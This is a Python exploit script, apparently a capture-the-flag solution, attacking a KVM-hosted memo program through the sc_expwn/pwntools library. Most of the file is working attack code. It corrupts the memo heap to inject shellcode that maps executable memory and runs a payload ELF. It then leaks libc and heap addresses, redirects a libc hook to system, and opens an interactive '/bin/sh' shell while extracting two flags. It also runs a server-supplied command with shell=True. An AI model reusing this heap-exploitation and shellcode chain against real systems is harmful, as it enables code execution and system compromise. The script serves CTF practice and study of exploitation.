#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
from os import chdir, path

bin_file = './kvm.elf'
args     = 'kernel.bin memo-static.elf flag2.txt'.split()+['a']*0x100
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file]+args, 'aslr':False}, \
                        local   = {'argv':['./pow.py', 'hoge'], 'stderr':open('/dev/null', 'w+')}, \
                        remote  = {'host':'localhost', 'port':16359})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.27.so')
env.select()

libcenv = Environment('old', 'new')
libcenv.set_item('arena_top', old = 0x58,  new = 0x60)

#==========

payload_elf = open('exploit.elf').read()

chdir('./release')
binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_freehook    = libc.symbols['__free_hook']
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

libc_name = path.basename(path.realpath(libc.path))
libcenv.select('new' if float(libc_name[5:5+4]) >= 2.27 else 'old')
offset_mainarena_top    = libcenv.arena_top

vm_binf = ELF(args[1])
addr_vm_memo        = vm_binf.symbols['memo']
addr_vm_heap        = 0x605000
addr_vm_memo_buf    = 0x7fff1ff000
addr_vm_stack       = 0x7ffffffff0

#==========

def attack(conn):
    if not env.check('debug'):
        if env.check('local'):
            conn.sendlineafter('\n', 'hoge')
        else:
            solve_pow(conn)
        conn.sendlineafter('> ', 'flag2.txt'+' a'*0x100)

    exploit_memo(conn, payload_elf, 0x150)

    flag1 = get_flag1(conn)
    success("flag1 : {}".format(flag1))

    flag2 = get_flag2(conn)
    success("flag2 : {}".format(flag2))

    get_shell(conn)

def solve_pow(conn):
    import subprocess

    cmd = conn.recvuntil('\n', drop=True)
    info(cmd)

    ret = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True).communicate()[0].strip()
    success('hash : {}'.format(ret))
    conn.sendline(ret)

def get_flag1(conn):
    conn.recvuntil('first flag : ')
    return conn.recvuntil('\n')

def get_flag2(conn):
    conn.recvuntil('ring0\n')
    return conn.recv(0x50).strip("\x00").split(' : ')[1]

def get_shell(conn):
    conn.send(p64(offset_libc_mainarena))
    conn.send(p64(offset_libc_freehook))

    conn.send(p64(offset_mainarena_top))

    addr_heap_top = u64(conn.recv(8))
    info('addr_heap_top     = 0x{:08x}'.format(addr_heap_top))

    conn.recv(8)

    addr_libc_mainarena = u64(conn.recv(8)) - offset_mainarena_top
    libc.address        = addr_libc_mainarena - offset_libc_mainarena
    addr_libc_system    = libc.sep_function['system']
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))

    addr_vmmem          = libc.address - 0x400000
    info('addr_vmmem        = 0x{:08x}'.format(addr_vmmem))

    conn.send(p64(addr_libc_system))
    conn.send(p64(u(p((addr_heap_top - addr_vmmem) & ~0xfffff)) | 0x83))
    conn.send(p64(((addr_heap_top - addr_vmmem) & 0xfffff) - 0x30))
    conn.send('/bin/sh\x00')

    conn.interactive()

def exploit_memo(conn, payload, ep):
    payload_size = (len(payload)+0xfff) & ~0xfff

    shellcode2  = shellcraft.mmap_rwx(payload_size)
    shellcode2 += shellcraft.read(0, 'rax', payload_size)
    shellcode2 += '''
    add rsi, {}
    jmp rsi
    '''.format(ep)
    shellcode2  = asm(shellcode2)

    shellcode1  = 'lea rsi, [rip]'
    shellcode1 += shellcraft.read(0, None, len(shellcode2)+0x10)
    shellcode1  = asm(shellcode1)

    memo = Memo(conn)

    memo.alloc('a'*0x28)            # 0
    memo.alloc('b')                 # 1
    memo.alloc('c'*0x8+p64(0x31)+p64(addr_vm_memo_buf+0x10-8)+p64(addr_vm_memo_buf+0x10))   # 2
    memo.alloc(p64(0x30)+p64(0x20)) # 3
    memo.alloc(shellcode1)          # 4
    memo.alloc(p64(0xdeadbeef)+p64(0)+p64(addr_vm_stack-0x8)+p64(0))                        # 5

    memo.edit(0, 'A'*0x28+chr(0x41))
    memo.delete(1)

    memo.alloc('b')                 # 1
    memo.edit(2, p64(addr_vm_memo+1)[:len(p64(addr_vm_heap).rstrip('\x00'))])
    sleep(0.1)
    memo.edit(1, p64(addr_vm_heap + 0x1100)[1:len(p64(addr_vm_memo_buf).rstrip('\x00'))])
    sleep(0.1)
    memo.edit(2, p64(addr_vm_heap + 0x10e0))

    sleep(0.1)
    conn.send('\x90'*0x10 + shellcode2)
    conn.send(payload)
    
class Memo:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def alloc(self, data):
        self.sendlineafter('> ', '1')
        self.sendafter('memo > ', data)

    def edit(self, idx, data):
        self.sendlineafter('> ', '2')
        self.sendlineafter('id > ', str(idx))
        self.sendafter('memo > ', data)

    def delete(self, idx):
        self.sendlineafter('> ', '3')
        self.sendlineafter('id > ', str(idx))

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)

#==========
